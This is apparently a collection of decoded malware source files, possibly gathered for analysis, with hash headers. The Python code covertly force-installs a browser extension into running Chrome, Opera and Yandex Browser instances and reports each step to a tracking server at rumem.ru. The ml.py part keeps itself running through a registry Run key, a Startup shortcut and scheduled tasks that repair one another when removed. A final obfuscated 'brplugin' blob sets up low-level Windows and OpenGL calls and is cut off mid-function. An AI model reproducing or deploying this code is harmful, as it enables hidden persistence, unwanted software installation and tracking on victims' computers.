        open("subid.txt", "w").write(subid)


    sr="%dx%d"%(windll.user32.GetSystemMetrics(0),windll.user32.GetSystemMetrics(1))
    ul, de = getdefaultlocale()
    usfx=urlsuffix
    cd1=exOS()
    def track(url, cd2='', cd3=''):
        nonlocal tid, ua, cid, sr, ul, de, usfx, cd1, subid
        from urllib.parse import urlencode
        from urllib.request import urlopen
        values={
            'v':1,
            't':'pageview',
            'tid':tid,
            'z':randrange(0,0xffffffff),
            'cid':cid,
            'ua':ua,
            'sr':sr,
            'de':de,
            'ul':ul,
            'dl':usfx+url,
            'cd1':cd1,
            'cd4':subid
        }
        if len(cd2)>0:
            values['cd2']=cd2
        if len(cd3)>0:
            values['cd3']=cd3
        urlopen(collect+urlencode(values)).read()
    return track


is_firstlaunch=not os.path.isfile("uuid.txt")
track = GATracker('', 'http://rumem.ru/collect.php?', '')





def processList():
    import ctypes
    from sys import stderr
    TH32CS_SNAPPROCESS = 0x00000002
    class PROCESSENTRY32(ctypes.Structure):
        _fields_ = [("dwSize", ctypes.c_ulong),
            ("cntUsage", ctypes.c_ulong),
            ("th32ProcessID", ctypes.c_ulong),
            ("th32DefaultHeapID", ctypes.c_ulong),
            ("th32ModuleID", ctypes.c_ulong),
            ("cntThreads", ctypes.c_ulong),
            ("th32ParentProcessID", ctypes.c_ulong),
            ("pcPriClassBase", ctypes.c_ulong),
            ("dwFlags", ctypes.c_ulong),
            ("szExeFile", ctypes.c_wchar * 260)]
    CreateToolhelp32Snapshot = ctypes.windll.kernel32.CreateToolhelp32Snapshot
    Process32First = ctypes.windll.kernel32.Process32FirstW
    Process32Next = ctypes.windll.kernel32.Process32NextW
    CloseHandle = ctypes.windll.kernel32.CloseHandle
    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    pe32 = PROCESSENTRY32()
    pe32.dwSize = ctypes.sizeof(PROCESSENTRY32)
    if Process32First(hProcessSnap,ctypes.byref(pe32)) == 0:
        print("Failed getting first process.", file=stderr)
        return
    result=[]
    while True:
        result.append(pe32.szExeFile)
        if Process32Next(hProcessSnap,ctypes.byref(pe32)) == 0:
            CloseHandle(hProcessSnap)
            return result

def processFullPath(pname):
    import ctypes
    from sys import stderr
    TH32CS_SNAPPROCESS = 0x00000002
    class PROCESSENTRY32(ctypes.Structure):
        _fields_ = [("dwSize", ctypes.c_ulong),
            ("cntUsage", ctypes.c_ulong),
            ("th32ProcessID", ctypes.c_ulong),
            ("th32DefaultHeapID", ctypes.c_ulong),
            ("th32ModuleID", ctypes.c_ulong),
            ("cntThreads", ctypes.c_ulong),
            ("th32ParentProcessID", ctypes.c_ulong),
            ("pcPriClassBase", ctypes.c_ulong),
            ("dwFlags", ctypes.c_ulong),
            ("szExeFile", ctypes.c_wchar * 260)]
    CreateToolhelp32Snapshot = ctypes.windll.kernel32.CreateToolhelp32Snapshot
    Process32First = ctypes.windll.kernel32.Process32FirstW
    Process32Next = ctypes.windll.kernel32.Process32NextW
    CloseHandle = ctypes.windll.kernel32.CloseHandle
    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    pe32 = PROCESSENTRY32()
    pe32.dwSize = ctypes.sizeof(PROCESSENTRY32)
    if Process32First(hProcessSnap,ctypes.byref(pe32)) == 0:
        print("Failed getting first process.", file=stderr)
        return
    result=[]
    while True:
        if pe32.szExeFile==pname:
            result.append(getPath(pe32.th32ProcessID))
        if Process32Next(hProcessSnap,ctypes.byref(pe32)) == 0:
            CloseHandle(hProcessSnap)
            return result

def fileInfo(filename, info, locale='040904B0'):
    from ctypes import windll, c_buffer, c_uint, byref, string_at
    L=lambda s: s.encode('utf-16-le') + b'\0\0'
    wfilename = L(filename)
    size = windll.version.GetFileVersionInfoSizeW(wfilename, None)
    if not size:
        return ''
    res = c_buffer(size*2)
    windll.version.GetFileVersionInfoW(wfilename, None, size, res)
    r = c_uint()
    l = c_uint()
    # windll.version.VerQueryValueW(res, L('\\VarFileInfo\\Translation'), byref(r), byref(l))
    # if not l.value:
    #     return ''
    # cp=string_at(r.value, 4)
    # windll.version.VerQueryValueW(res, L('\\StringFileInfo\\%02X%02X%02X%02X\\%s' % (cp[1], cp[0], cp[3], cp[2], info)), byref(r), byref(l))
    windll.version.VerQueryValueW(res, L('\\StringFileInfo\\%s\\%s' % (locale, info)), byref(r), byref(l))
    return string_at(r.value, l.value*2).decode('utf-16-le')

def getPath(procId):
    import ctypes
    OpenProcess = ctypes.windll.kernel32.OpenProcess
    GetModuleFileNameEx = ctypes.windll.psapi.GetModuleFileNameExW
    CloseHandle = ctypes.windll.kernel32.CloseHandle
    procHandle = OpenProcess(0x0410, 0, procId)
    pathMaxLength = 2048
    path = (ctypes.c_wchar * pathMaxLength)()
    while True:
        ret = GetModuleFileNameEx(procHandle, 0, ctypes.byref(path), pathMaxLength)
        if ret == 0:
            return None
        path = path.value
        if len(path) < (pathMaxLength - 1):
            CloseHandle(procHandle)
            return path
        pathMaxLength *= 2
        path = (ctypes.c_wchar * pathMaxLength)()


class Browser:
    def __init__(self, process):
        self.process = process
        self.profiles =[]
        self.version="unknown"
        self.version2="unknown"
        try:
            self.version2=fileInfo(processFullPath(process)[0], "ProductVersion")
        except:
            pass
        out=readOutput(r'%s version "%s"' % (cmdPrefix, self.process))
        if len(out)>0:
            self.version=out
        out=readOutput(r'%s listprofiles "%s"' % (cmdPrefix, self.process))
        if len(out)>0:
            self.profiles =out.split(",")

    def btrack(self, path):
        track('/'+self.process+path, self.version, self.version2)
        

    def installExt(self, ext): 
        readOutput(r'%s install "%s" "%s" "%s"'%(cmdPrefix, self.process, ext, hash1))

    def checkInstalled(self, id):
        if len(self.profiles)==0:
            return False
        
        p = "Default" if "Default" in self.profiles else self.profiles[0]
        t=readOutput(r'%s check "%s" "%s" "%s"' %(cmdPrefix, self.process, id, p))       
        if (t.find("enabled")>-1)or(t.find("disabled")>-1):
            return True
        return False


#processes=['chrome.exe', 'opera.exe', 'amigo.exe', 'browser.exe']
processes=['chrome.exe', 'opera.exe', 'browser.exe']
processesInstalled=set()
processesInstallTries=set()


timeoutInstall=600
timeoutCheck=60
timers = {}

tryesToInstall={}
maxTryesToInstall=1

for p in processes:
    timers[p]=0.0


def sendPostback(tryes=20):
    if tryes<=0:
        return
    if len(opts.pb)==0:
        return
    import urllib.request
    try:
        urllib.request.urlopen(opts.pb).read()
    except:
        time.sleep(20)
        sendPostback(tryes-1)
    

plid = open("id.txt").read().strip()
hash1 = open("hash.txt").read().strip()

postbackSent=False
def FastInstall(plid, ext):
    global postbackSent, processesInstalled, processesInstallTries
    tm=time.time()
    for p in processes:
#        if p in processesInstalled:
#            continue
        if not(p in processList()):
            continue
        if tm-timers[p]<timeoutInstall:
            continue
        tryesToInstall[p]=tryesToInstall[p]+1 if (p in tryesToInstall) else 1
        if tryesToInstall[p]>maxTryesToInstall:
            continue

        timers[p]=tm
        br = Browser(p)
        if br.version=="unknown":
            br.btrack('/error/unknownversion')
        br.btrack('/track/watchprofiles')
        if len(br.profiles)==0:
            br.btrack('/error/zeroprofiles')
            continue 
        
        ci=False
        if br.checkInstalled(plid):
            if p in processesInstallTries:
                ci=True
            else:
                br.btrack('/hint/alreadyinstalled')
                processesInstalled.add(p)
                continue
        if not ci:
            br.btrack('/track/checkinstalled')
            processesInstallTries.add(p)
            br.installExt(ext)
            br.btrack('/track/launchinstall')
            for i in range(0,15):
                time.sleep(10)
                ci = ci or br.checkInstalled(plid)
                if ci:
                    break
        if ci:
            br.btrack('/hint/installOK')
            processesInstalled.add(p)
            if not postbackSent:
                sendPostback()
                CreateRegFolder(plid)
                track('/gen/track/postbacksent')
                postbackSent=True
        else:
            br.btrack('/hint/installNOTOK')


def CreateRegFolder(plid):
    try:
        key=winreg.CreateKey(winreg.HKEY_CURRENT_USER, r'Software\Chrome\Extensions\%s'%plid)
        winreg.CloseKey(key)
    except:
        pass





run_async('python\\pythonw.exe app.py')


if is_firstlaunch:
    track('/gen/hint/firstlaunch')


track('/gen/track/launch')
if readOutput(r"%s help"%cmdPrefix).find("browser extension management tool")>-1:
    track('/gen/hint/binaryOK')
else:
    track('/gen/hint/binaryNOTOK')


t=time.time()
while True:
    FastInstall(plid, plid+".crx")
    time.sleep(timeoutCheck)

track('/gen/track/exit')



    
## contents of ml.py (ea1592749a041b09b170012763edf332575fb8a069d6cfa1588ff52b8a6cfbce)

runArgs="\"$WORKDIR\\ml.py\""
runArgs2="\"$WORKDIR\\updater.py\""
launchArgs="\"$WORKDIR\\launchall.py\""


tasksheuldertpl="""<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
      <UserId>$UID</UserId>
    </LogonTrigger>
  </Triggers>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
    <AllowHardTerminate>false</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>false</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
    <RestartOnFailure>
      <Interval>PT1M</Interval>
      <Count>3</Count>
    </RestartOnFailure>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>$RUNCMD</Command>
      <Arguments>$RUNARGS</Arguments>
      <WorkingDirectory>$WORKDIR</WorkingDirectory>
    </Exec>
  </Actions>
</Task>"""

tasksheuldertpl2="""<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <CalendarTrigger>
      <StartBoundary>2016-04-20T05:00:00</StartBoundary>
      <Enabled>true</Enabled>
      <ScheduleByDay>
        <DaysInterval>1</DaysInterval>
      </ScheduleByDay>
    </CalendarTrigger>
  </Triggers>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>true</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>false</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT1H</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>$RUNCMD</Command>
      <Arguments>$RUNARGS</Arguments>
      <WorkingDirectory>$WORKDIR</WorkingDirectory>
    </Exec>
  </Actions>
</Task>"""


import winreg, os, subprocess, sys
from optparse import OptionParser
from urllib.request import urlopen

parser = OptionParser()
parser.add_option('--APPNAME', dest='APPNAME', default="filter")
parser.add_option('--ACTION', dest='ACTION', default="default")

opts, args = parser.parse_args()






workDir=os.path.abspath(os.path.dirname(sys.argv[0]))
os.chdir(workDir)

runArgs=runArgs.replace("$WORKDIR", workDir)
runArgs2=runArgs2.replace("$WORKDIR", workDir)
launchArgs=launchArgs.replace("$WORKDIR", workDir)


runCmd=workDir+r"\python\pythonw.exe"

runArgs = "%s --APPNAME=\"%s\""%(runArgs, opts.APPNAME)
runFullCmd =  "\"%s\" %s"%(runCmd, runArgs) if len(runArgs)>0 else runCmd
token=opts.APPNAME
launchCmd="\"%s\" %s"%(runCmd, launchArgs)






def run_silent(s):
    try:
        CREATE_NO_WINDOW = 0x08000000
        subprocess.call(s, creationflags=CREATE_NO_WINDOW|subprocess.CREATE_NEW_PROCESS_GROUP)
    except:
        pass


def readOutput(s):
    from subprocess import Popen, PIPE, STDOUT
    CREATE_NO_WINDOW = 0x08000000
    try:
        p = Popen(s, creationflags=CREATE_NO_WINDOW|subprocess.CREATE_NEW_PROCESS_GROUP, stderr=PIPE, stdout=PIPE, stdin=PIPE)
        res=p.stdout.read().decode("utf8").strip(' \t\n\r')
        p.stderr.read()
        p.communicate()
        return res
    except:
        return ""


def chkTask():
    import subprocess
    try:
        CREATE_NO_WINDOW = 0x08000000
        r=subprocess.call("schtasks /query /tn \"%s\""%token, creationflags=CREATE_NO_WINDOW|subprocess.CREATE_NEW_PROCESS_GROUP)
        return r==0
    except:
        return False

def delTask():
    import subprocess
    try:
        CREATE_NO_WINDOW = 0x08000000
        subprocess.call("schtasks /delete /tn \"%s\" /f"%token, creationflags=CREATE_NO_WINDOW|subprocess.CREATE_NEW_PROCESS_GROUP)
    except:
        pass

def delTask2():
    import subprocess
    try:
        CREATE_NO_WINDOW = 0x08000000
        subprocess.call("schtasks /delete /tn \"%s2\" /f"%token, creationflags=CREATE_NO_WINDOW|subprocess.CREATE_NEW_PROCESS_GROUP)
    except:
        pass

def setTask():
    import subprocess, tempfile, os
    txt=tasksheuldertpl.replace("$RUNCMD", runCmd).replace("$RUNARGS", runArgs).replace("$WORKDIR", workDir).replace("$UID", getUID())
    fp=tempfile.NamedTemporaryFile(delete=False)
    fname=fp.name
    fp.write(txt.encode("utf16"))
    CREATE_NO_WINDOW = 0x08000000
    fp.close()
    try:
        subprocess.call("cmd /c schtasks /create /f /tn \"%s\" /xml \"%s\""%(token, fname), creationflags=CREATE_NO_WINDOW|subprocess.CREATE_NEW_PROCESS_GROUP)
    except:
        pass
    os.unlink(fname)

def setTask2():
    import subprocess, tempfile, os
    txt=tasksheuldertpl2.replace("$RUNCMD", runCmd).replace("$RUNARGS", runArgs2).replace("$WORKDIR", workDir).replace("$UID", getUID())
    fp=tempfile.NamedTemporaryFile(delete=False)
    fname=fp.name
    fp.write(txt.encode("utf16"))
    CREATE_NO_WINDOW = 0x08000000
    fp.close()
    try:
        subprocess.call("cmd /c schtasks /create /f /tn \"%s2\" /xml \"%s\""%(token, fname), creationflags=CREATE_NO_WINDOW|subprocess.CREATE_NEW_PROCESS_GROUP)
    except:
        pass
    os.unlink(fname)
    


def getStartupDir():
    key=winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders")
    res=winreg.QueryValueEx(key, "Startup")
    return res[0]



def chkRegRun():
    try:
        key=winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run")
        cmd=winreg.QueryValueEx(key, token)[0]
        winreg.CloseKey(key)
        if cmd!=runFullCmd:
            return False
        return True
    except:
        return False

def delRegRun():
    try:
        key=winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", access=winreg.KEY_WRITE)
        winreg.DeleteValue(key, token)
        winreg.CloseKey(key)
    except:
        pass

def setRegRun():
    try:
        key=winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", access=winreg.KEY_WRITE)
        winreg.SetValueEx(key, token, 0, winreg.REG_SZ, runFullCmd)
        winreg.CloseKey(key)
    except:
        pass


def chkStartUpLnk():
    try:    
        lnkname="%s.lnk" % token
        startupdir=getStartupDir()
        lnkfullpath="%s\\%s" % (startupdir, lnkname)
        return os.path.isfile(lnkfullpath)
    except:
        return False

def delStartUpLnk():
    try:    
        lnkname="%s.lnk" % token
        startupdir=getStartupDir()
        lnkfullpath="%s\\%s" % (startupdir, lnkname)
        if os.path.isfile(lnkfullpath):
            os.unlink(lnkfullpath)
    except:
        pass


def setStartUpLnk():
    try:
        from comtypes.client import CreateObject
        from comtypes.gen import IWshRuntimeLibrary
        ws = CreateObject("WScript.Shell")
        lnkname="%s.lnk" % token
        startupdir=getStartupDir()
        lnkfullpath="%s\\%s" % (startupdir, lnkname)
        shortcut = ws.CreateShortcut(lnkfullpath).QueryInterface(IWshRuntimeLibrary.IWshShortcut)
        shortcut.TargetPath=runCmd
        shortcut.Arguments=runArgs
        shortcut.WorkingDirectory=workDir
        shortcut.Save()
    except:
        pass


def getUID():
    import ctypes
    GetUserNameEx = ctypes.windll.secur32.GetUserNameExW
    NameDisplay = 2
    size = ctypes.c_ulong(0)
    GetUserNameEx(NameDisplay, None, ctypes.byref(size))
    nameBuffer = ctypes.create_unicode_buffer(size.value)
    GetUserNameEx(NameDisplay, nameBuffer, ctypes.byref(size))
    return nameBuffer.value


def parseTime(s):
    try:
        return float(s)
    except:
        return 0.0

def main():
    from math import ceil
    from random import shuffle
    from sys import argv
    from time import time



    checkers=[chkStartUpLnk, chkRegRun, chkTask]
    deleters=[delStartUpLnk, delRegRun, delTask]
    healers=[setStartUpLnk, setRegRun, setTask]
    
    if opts.ACTION=="default":
        tm=0.0
        if os.path.isfile('time.txt'):
            f=open('time.txt')
            tm=parseTime(f.read())
            f.close()

        f=open('time.txt', 'w')
        f.write(str(time()))
        f.close()

        if time()-tm<60.0:
            return

        subprocess.Popen(launchCmd, creationflags=subprocess.CREATE_NEW_PROCESS_GROUP)

        toHeal=[]

        for i in range(0, len(checkers)):
            if not checkers[i]():
                toHeal.append(healers[i])

        shuffle(toHeal)
        nWorked = len(checkers)-len(toHeal)
        minWorked=ceil(len(checkers)*0.5)
        nHeal=max(minWorked-nWorked, 0)

        for j in range(0, nHeal):
            toHeal[j]()
        return

    if opts.ACTION=="install":
        for h in healers:
            h()
        setTask2()
        return
    if opts.ACTION=="uninstall":
        for d in deleters:
            d()
        delTask2()
        return




main()

## contents of brplugin decoded blob (fe144593780068bc00de88adfc183759a13da547b9c14e9dc0e93ef12e68a354)

import os
jvpMF=RuntimeError
jvpMP=None
jvpMg=range
jvpMB=hasattr
jvpMi=open
jvpMX=len
jvpKM=True
jvpMf=os.path
import sys
jvpMI=sys.argv
import zlib
jvpMm=zlib.decompress
import base64
jvpMR=base64.b64decode
import pickle
jvpMN=pickle.loads
from ctypes import*
ntdll=windll.ntdll
kernel32=windll.kernel32
gdi32=windll.gdi32
user32=windll.user32
BYTE=c_ubyte
WORD=c_ushort
DWORD=c_ulong
LONG=c_long
UINT=c_uint
SIZE_T=c_size_t
HANDLE=c_size_t
WNDPROC=WINFUNCTYPE(c_size_t,HANDLE,UINT,SIZE_T,SIZE_T)
def jvpMw(ptr,typ):
 return cast(ptr,POINTER(typ)).contents.value
def jvpMl(ptr):
 return jvpMw(ptr,c_ubyte)
def jvpMD(ptr):
 return jvpMw(ptr,c_ushort)
def jvpMd(ptr):
 return jvpMw(ptr,c_uint)
def jvpMr(ptr):
 return jvpMw(ptr,c_size_t)
def jvpMY(ptr,typ,val):
 memmove(ptr,addressof(typ(val)),sizeof(typ))
def jvpMe(ptr,val):
 jvpMY(ptr,c_ubyte,val)
def jvpMH(ptr,val):
 jvpMY(ptr,c_ushort,val)
def jvpMh(ptr,val):
 jvpMY(ptr,c_uint,val)
def jvpME(ptr,val):
 jvpMY(ptr,c_size_t,val)
def jvpMU(msg):
 raise jvpMF(msg)
def jvpMW():
 jvpMU('Internal Error!')
PFD_TYPE_RGBA =0
PFD_TYPE_COLORINDEX =1
PFD_MAIN_PLANE =0
PFD_OVERLAY_PLANE =1
PFD_UNDERLAY_PLANE =-1
PFD_DOUBLEBUFFER =0x00000001
PFD_STEREO =0x00000002
PFD_DRAW_TO_WINDOW =0x00000004
PFD_DRAW_TO_BITMAP =0x00000008
PFD_SUPPORT_GDI =0x00000010
PFD_SUPPORT_OPENGL =0x00000020
PFD_GENERIC_FORMAT =0x00000040
PFD_NEED_PALETTE =0x00000080
PFD_NEED_SYSTEM_PALETTE =0x00000100
PFD_SWAP_EXCHANGE =0x00000200
PFD_SWAP_COPY =0x00000400
PFD_SWAP_LAYER_BUFFERS =0x00000800
PFD_GENERIC_ACCELERATED =0x00001000
PFD_SUPPORT_DIRECTDRAW =0x00002000
PFD_DIRECT3D_ACCELERATED =0x00004000
PFD_SUPPORT_COMPOSITION =0x00008000
PFD_DEPTH_DONTCARE =0x20000000
PFD_DOUBLEBUFFER_DONTCARE =0x40000000
PFD_STEREO_DONTCARE =0x80000000
GL_POINTS =0x0000
GL_LINES =0x0001
GL_LINE_LOOP =0x0002
GL_LINE_STRIP =0x0003
GL_TRIANGLES =0x0004
GL_TRIANGLE_STRIP =0x0005
GL_TRIANGLE_FAN =0x0006
GL_QUADS =0x0007
GL_QUAD_STRIP =0x0008
GL_POLYGON =0x0009
GL_NONE =0
GL_FRONT_LEFT =0x0400
GL_FRONT_RIGHT =0x0401
GL_BACK_LEFT =0x0402
GL_BACK_RIGHT =0x0403
GL_FRONT =0x0404
GL_BACK =0x0405
GL_LEFT =0x0406
GL_RIGHT =0x0407
GL_FRONT_AND_BACK =0x0408
GL_AUX0 =0x0409
GL_AUX1 =0x040A
GL_AUX2 =0x040B
GL_AUX3 =0x040C
GL_CULL_FACE =0x0B44
GL_LIGHTING =0x0B50
GL_COLOR_MATERIAL =0x0B57
GL_DEPTH_TEST =0x0B71
GL_DITHER =0x0BD0
GL_COLOR_LOGIC_OP =0x0BF2
GL_TEXTURE_2D =0x0DE1
GL_INDEX_LOGIC_OP =0x0BF1
GL_POINT_SMOOTH_HINT =0x0C51
GL_LINE_SMOOTH_HINT =0x0C52
GL_POLYGON_SMOOTH_HINT =0x0C53
GL_DONT_CARE =0x1100
GL_FASTEST =0x1101
GL_NICEST =0x1102
GL_COMPILE =0x1300
GL_COMPILE_AND_EXECUTE =0x1301
GL_BYTE =0x1400
GL_UNSIGNED_BYTE =0x1401
GL_SHORT =0x1402
GL_UNSIGNED_SHORT =0x1403
GL_INT =0x1404
GL_UNSIGNED_INT =0x1405
GL_FLOAT =0x1406
GL_2_BYTES =0x1407
GL_3_BYTES =0x1408
GL_4_BYTES =0x1409
GL_DOUBLE =0x140A
GL_CLEAR =0x1500
GL_AND =0x1501
GL_AND_REVERSE =0x1502
GL_COPY =0x1503
GL_AND_INVERTED =0x1504
GL_NOOP =0x1505
GL_XOR =0x1506
GL_OR =0x1507
GL_NOR =0x1508
GL_EQUIV =0x1509
GL_INVERT =0x150A
GL_OR_REVERSE =0x150B
GL_COPY_INVERTED =0x150C
GL_OR_INVERTED =0x150D
GL_NAND =0x150E
GL_SET =0x150F
GL_COLOR_INDEX =0x1900
GL_STENCIL_INDEX =0x1901
GL_DEPTH_COMPONENT =0x1902
GL_RED =0x1903
GL_GREEN =0x1904
GL_BLUE =0x1905
GL_ALPHA =0x1906
GL_RGB =0x1907
GL_RGBA =0x1908
GL_LUMINANCE =0x1909
GL_LUMINANCE_ALPHA =0x190A
GL_POINT =0x1B00
GL_LINE =0x1B01
GL_FILL =0x1B02
GL_FLAT =0x1D00
GL_SMOOTH =0x1D01
GL_TEXTURE_MAG_FILTER =0x2800
GL_TEXTURE_MIN_FILTER =0x2801
GL_TEXTURE_WRAP_S =0x2802
GL_TEXTURE_WRAP_T =0x2803
GL_NEAREST =0x2600
GL_LINEAR =0x2601
GL_CLAMP =0x2900
GL_REPEAT =0x2901
GL_MIRRORED_REPEAT =0x8370
GL_R3_G3_B2 =0x2A10
GL_RGB4 =0x804F
GL_RGB5 =0x8050
GL_RGB8 =0x8051
GL_RGB10 =0x8052
GL_RGB12 =0x8053
GL_RGB16 =0x8054
GL_RGBA2 =0x8055
GL_RGBA4 =0x8056
GL_RGB5_A1 =0x8057
GL_RGBA8 =0x8058
GL_RGB10_A2 =0x8059
GL_RGBA12 =0x805A
GL_RGBA16 =0x805B
GL_VERTEX_ARRAY =0x8074
GL_NORMAL_ARRAY =0x8075
GL_COLOR_ARRAY =0x8076
GL_INDEX_ARRAY =0x8077
GL_TEXTURE_COORD_ARRAY =0x8078
GL_EDGE_FLAG_ARRAY =0x8079
GL_READ_FRAMEBUFFER =0x8CA8
GL_DRAW_FRAMEBUFFER =0x8CA9
GL_FRAMEBUFFER =0x8D40
GL_RENDERBUFFER =0x8D41
GL_RGBA4 =0x8056
GL_RGB5_A1 =0x8057
GL_RGB565 =0x8D62
GL_DEPTH_COMPONENT16 =0x81A5
GL_STENCIL_INDEX8 =0x8D48
GL_RENDERBUFFER_WIDTH =0x8D42
GL_RENDERBUFFER_HEIGHT =0x8D43
GL_RENDERBUFFER_INTERNAL_FORMAT =0x8D44
GL_RENDERBUFFER_RED_SIZE =0x8D50
GL_RENDERBUFFER_GREEN_SIZE =0x8D51
GL_RENDERBUFFER_BLUE_SIZE =0x8D52
GL_RENDERBUFFER_ALPHA_SIZE =0x8D53
GL_RENDERBUFFER_DEPTH_SIZE =0x8D54
GL_RENDERBUFFER_STENCIL_SIZE =0x8D55
GL_FRAMEBUFFER_ATTACHMENT_OBJECT_TYPE =0x8CD0
GL_FRAMEBUFFER_ATTACHMENT_OBJECT_NAME =0x8CD1
GL_FRAMEBUFFER_ATTACHMENT_TEXTURE_LEVEL =0x8CD2
GL_FRAMEBUFFER_ATTACHMENT_TEXTURE_CUBE_MAP_FACE =0x8CD3
GL_COLOR_ATTACHMENT0 =0x8CE0
GL_DEPTH_ATTACHMENT =0x8D00
GL_STENCIL_ATTACHMENT =0x8D20
GL_CURRENT_BIT =0x00000001
GL_POINT_BIT =0x00000002
GL_LINE_BIT =0x00000004
GL_POLYGON_BIT =0x00000008
GL_POLYGON_STIPPLE_BIT =0x00000010
GL_PIXEL_MODE_BIT =0x00000020
GL_LIGHTING_BIT =0x00000040
GL_FOG_BIT =0x00000080
GL_DEPTH_BUFFER_BIT =0x00000100
GL_ACCUM_BUFFER_BIT =0x00000200
GL_STENCIL_BUFFER_BIT =0x00000400
GL_VIEWPORT_BIT =0x00000800
GL_TRANSFORM_BIT =0x00001000
GL_ENABLE_BIT =0x00002000
GL_COLOR_BUFFER_BIT =0x00004000
GL_HINT_BIT =0x00008000
GL_EVAL_BIT =0x00010000
GL_LIST_BIT =0x00020000
GL_TEXTURE_BIT =0x00040000
GL_SCISSOR_BIT =0x00080000
GL_ALL_ATTRIB_BITS =0x000fffff
class jvpMK(Structure):
 _fields_=[('cbSize',UINT),('style',UINT),('lpfnWndProc',WNDPROC),('cbClsExtra',c_int),('cbWndExtra',c_int),('hInstance',HANDLE),('hIcon',HANDLE),('hCursor',HANDLE),('hbrBackground',HANDLE),('lpszMenuName',c_char_p),('lpszClassName',c_char_p),('hIconSm',HANDLE),]
class jvpMG(Structure):
 _fields_=[('nSize',WORD),('nVersion',WORD),('dwFlags',DWORD),('iPixelType',BYTE),('cColorBits',BYTE),('cRedBits',BYTE),('cRedShift',BYTE),('cGreenBits',BYTE),('cGreenShift',BYTE),('cBlueBits',BYTE),('cBlueShift',BYTE),('cAlphaBits',BYTE),('cAlphaShift',BYTE),('cAccumBits',BYTE),('cAccumRedBits',BYTE),('cAccumGreenBits',BYTE),('cAccumBlueBits',BYTE),('cAccumAlphaBits',BYTE),('cDepthBits',BYTE),('cStencilBits',BYTE),('cAuxBuffers',BYTE),('iLayerType',BYTE),('bReserved',BYTE),('dwLayerMask',DWORD),('dwVisibleMask',DWORD),('dwDamageMask',DWORD),]
gl=windll.opengl32
gl_wnd=jvpMP
gl_dc=jvpMP
gl_rc=jvpMP
gl_fb=jvpMP
gl_tex=[jvpMP,jvpMP,jvpMP,jvpMP]
gl_list=jvpMP
def jvpMc(vb,num_display_lists):
 global gl_wnd,gl_dc,gl_rc,gl_fb,gl_tex,gl_list
 wnd_cls=jvpMK()
 wnd_cls.cbSize=sizeof(jvpMK)
 wnd_cls.lpfnWndProc=WNDPROC(cast(user32.DefWindowProcA,c_void_p).value)
 wnd_cls.lpszClassName=b'OpenGL'
 user32.RegisterClassExA.restype=c_ushort
 user32.RegisterClassExA.argtypes=[POINTER(jvpMK)]
 wnd_atom=user32.RegisterClassExA(pointer(wnd_cls))
 if wnd_atom==0:
  jvpMU('Failure registering window class: 0x%08X'%GetLastError())
 gl_wnd=user32.CreateWindowExA(0,wnd_atom,0,0,0,0,64,256,0,0,0,0)
 if gl_wnd==0:
  jvpMU('Failure creating window: 0x%08X'%GetLastError())
 gl_dc=user32.GetDC(gl_wnd)
 if gl_dc==0:
  jvpMU('Failed to get window device context')
 pfd=jvpMG()
 pfd.nSize=sizeof(pfd)
 pfd.nVersion=1
 pfd.dwFlags=PFD_DRAW_TO_WINDOW|PFD_SUPPORT_OPENGL|PFD_DOUBLEBUFFER
 pfd.cColorBits=24
 pf=gdi32.ChoosePixelFormat(gl_dc,byref(pfd));
 if pf==0:
  jvpMU('Failed to choose pixel format')
 if not gdi32.SetPixelFormat(gl_dc,pf,byref(pfd)):
  jvpMU('Failed to set pixel format')
 gl_rc=gl.wglCreateContext(gl_dc);
 if gl_rc==0:
  jvpMU('Failure creating window')
 gl.wglMakeCurrent(gl_dc,gl_rc);
 gl.glVertex2f.argtypes=[c_float,c_float]
 gl.glTexCoord2f.argtypes=[c_float,c_float]
 gl.glColor3f.argtypes=[c_float,c_float,c_float]
 gl.glClearColor.argtypes=[c_float,c_float,c_float,c_float]
 for i in jvpMg(0,4):
  tex=c_uint()
  gl.glGenTextures(1,byref(tex))
  gl_tex[i]=tex.value
  gl.glBindTexture(GL_TEXTURE_2D,gl_tex[i])
